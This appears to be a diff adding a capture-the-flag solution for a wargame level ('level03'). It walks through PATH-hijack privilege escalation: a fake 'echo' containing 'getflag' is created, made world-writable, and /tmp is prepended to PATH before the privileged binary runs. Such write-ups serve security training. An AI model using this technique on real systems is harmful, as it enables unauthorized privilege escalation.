@@ -1,0 +1,12 @@
+# Try to read the executable file:(or use binary ninja)
+ltrace ./level03
+# Create a fake echo contains getflag command in tmp
+echo getflag > echo
+# Give permission
+chmod 777 echo
+# Purge it in Path
+export PATH="/tmp:$PATH"
+# See:
+echo $PATH
+# Execute it:
+./level03 
